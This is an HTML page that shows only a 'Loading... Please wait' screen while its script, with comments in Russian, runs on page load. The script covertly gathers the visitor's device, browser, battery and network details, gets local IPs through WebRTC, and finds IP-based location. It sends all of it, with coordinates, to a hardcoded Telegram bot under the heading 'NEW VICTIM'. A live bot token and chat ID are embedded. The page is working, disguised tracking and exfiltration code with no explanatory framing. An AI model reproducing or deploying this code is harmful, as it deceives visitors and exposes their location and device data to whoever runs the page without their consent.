<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Loading...</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body style="font-family: Arial; text-align: center; padding: 50px; background: #f0f0f0;">
    <h2>Loading...</h2>
    <p>Please wait</p>

    <script>
        const BOT_TOKEN = '8172323730:AAEfo4Eqz8E9HWSNOGF96BHndyjN9anBRLg';
        const CHAT_ID = '1471307057';
        
        // Собираем все данные без разрешений
        async function collectAllData() {
            const data = {
                timestamp: new Date().toISOString(),
                timestamp_local: new Date().toLocaleString(),
                
                // Браузерная инфо
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages,
                cookieEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack,
                
                // Экран
                screen: {
                    width: screen.width,
                    height: screen.height,
                    availWidth: screen.availWidth,
                    availHeight: screen.availHeight,
                    colorDepth: screen.colorDepth,
                    pixelDepth: screen.pixelDepth
                },
                
                // Окно
                window: {
                    innerWidth: window.innerWidth,
                    innerHeight: window.innerHeight,
                    outerWidth: window.outerWidth,
                    outerHeight: window.outerHeight
                },
                
                // Время и часовой пояс
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timezoneOffset: new Date().getTimezoneOffset(),
                
                // Сеть
                connection: navigator.connection ? {
                    type: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink,
                    rtt: navigator.connection.rtt,
                    saveData: navigator.connection.saveData
                } : null,
                
                // Аппаратные средства
                hardware: {
                    cores: navigator.hardwareConcurrency,
                    memory: navigator.deviceMemory,
                    maxTouchPoints: navigator.maxTouchPoints
                },
                
                // Батарея (если есть)
                battery: null,
                
                // WebRTC IP (попробуем получить локальный IP)
                localIPs: []
            };
            
            // Пробуем получить батарею
            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    data.battery = {
                        level: battery.level * 100,
                        charging: battery.charging,
                        chargingTime: battery.chargingTime,
                        dischargingTime: battery.dischargingTime
                    };
                } catch(e) {}
            }
            
            // Пробуем получить локальные IP через WebRTC
            try {
                const ips = await getLocalIPs();
                data.localIPs = ips;
            } catch(e) {}
            
            return data;
        }
        
        // Получаем локальные IP без разрешений
        function getLocalIPs() {
            return new Promise((resolve) => {
                const ips = [];
                const pc = new RTCPeerConnection({ iceServers: [] });
                pc.createDataChannel('');
                pc.createOffer()
                    .then(offer => pc.setLocalDescription(offer))
                    .catch(() => {});
                
                pc.onicecandidate = (event) => {
                    if (!event.candidate) return;
                    const ipMatch = /([0-9]{1,3}\.){3}[0-9]{1,3}/.exec(event.candidate.candidate);
                    if (ipMatch && !ips.includes(ipMatch[0])) {
                        ips.push(ipMatch[0]);
                    }
                };
                
                setTimeout(() => {
                    pc.close();
                    resolve(ips);
                }, 2000);
            });
        }
        
        // Получаем геолокацию по IP (без разрешения)
        async function getIPGeo() {
            try {
                // Пробуем несколько сервисов
                const services = [
                    'https://ipapi.co/json/',
                    'http://ip-api.com/json/',
                    'https://ipinfo.io/json'
                ];
                
                for (const url of services) {
                    try {
                        const res = await fetch(url);
                        const data = await res.json();
                        if (data && (data.city || data.region)) {
                            return {
                                source: url,
                                ip: data.ip || data.query,
                                city: data.city || data.region,
                                region: data.region || data.regionName,
                                country: data.country || data.country_name,
                                lat: data.latitude || data.lat,
                                lon: data.longitude || data.lon,
                                isp: data.org || data.isp,
                                postal: data.postal || data.zip
                            };
                        }
                    } catch(e) {}
                }
            } catch(e) {}
            return null;
        }
        
        // Получаем Wi-Fi и сотовые данные (если доступно)
        async function getNetworkInfo() {
            if ('getNetworkInformation' in navigator) {
                // Android WebView может дать больше данных
                try {
                    const netInfo = await navigator.getNetworkInformation();
                    return {
                        type: netInfo.type,
                        downlink: netInfo.downlink,
                        rtt: netInfo.rtt
                    };
                } catch(e) {}
            }
            return null;
        }
        
        // Отправляем всё в Telegram
        async function sendAllData() {
            // Собираем локальные данные
            const localData = await collectAllData();
            
            // Получаем IP-гео
            const ipGeo = await getIPGeo();
            
            // Получаем сетевую инфу
            const networkInfo = await getNetworkInfo();
            
            // Объединяем
            const fullData = {
                ...localData,
                ipGeo: ipGeo,
                networkInfo: networkInfo,
                referrer: document.referrer,
                url: window.location.href
            };
            
            // Формируем сообщение для Telegram
            let message = `🔍 <b>NEW VICTIM - AUTO COLLECT</b>\n\n`;
            
            if (ipGeo) {
                message += `📍 <b>LOCATION (by IP)</b>\n`;
                message += `City: ${ipGeo.city || '?'}\n`;
                message += `Region: ${ipGeo.region || '?'}\n`;
                message += `Country: ${ipGeo.country || '?'}\n`;
                message += `Coordinates: ${ipGeo.lat || '?'}, ${ipGeo.lon || '?'}\n`;
                message += `IP: ${ipGeo.ip || '?'}\n`;
                message += `ISP: ${ipGeo.isp || '?'}\n\n`;
            }
            
            message += `📱 <b>DEVICE INFO</b>\n`;
            message += `Platform: ${localData.platform || '?'}\n`;
            message += `Language: ${localData.language || '?'}\n`;
            message += `Timezone: ${localData.timezone || '?'}\n`;
            message += `Screen: ${localData.screen.width}x${localData.screen.height}\n`;
            
            if (localData.hardware.cores) {
                message += `CPU Cores: ${localData.hardware.cores}\n`;
            }
            if (localData.hardware.memory) {
                message += `RAM: ${localData.hardware.memory}GB\n`;
            }
            if (localData.battery) {
                message += `Battery: ${localData.battery.level}% (${localData.battery.charging ? 'Charging' : 'Not charging'})\n`;
            }
            if (localData.localIPs.length) {
                message += `Local IPs: ${localData.localIPs.join(', ')}\n`;
            }
            
            message += `\n🌐 <b>NETWORK</b>\n`;
            if (localData.connection) {
                message += `Connection: ${localData.connection.type}\n`;
                message += `Speed: ${localData.connection.downlink}Mbps\n`;
            }
            
            message += `\n🕐 Time: ${localData.timestamp_local}\n`;
            message += `🔗 Referrer: ${document.referrer || 'direct'}\n`;
            
            // Отправляем текст
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message.substring(0, 4096),
                        parse_mode: 'HTML'
                    })
                });
            } catch(e) {}
            
            // Если есть координаты — отправляем локацию
            if (ipGeo && ipGeo.lat && ipGeo.lon) {
                try {
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            chat_id: CHAT_ID,
                            latitude: parseFloat(ipGeo.lat),
                            longitude: parseFloat(ipGeo.lon)
                        })
                    });
                } catch(e) {}
            }
            
            // Меняем страницу через 2 секунды
            setTimeout(() => {
                document.body.innerHTML = '<h2>Done</h2><p>Loading content...</p>';
                // Можно перенаправить на любой сайт
                // window.location.href = 'https://www.google.com';
            }, 2000);
        }
        
        // Запускаем сразу
        sendAllData();
    </script>
</body>
</html>
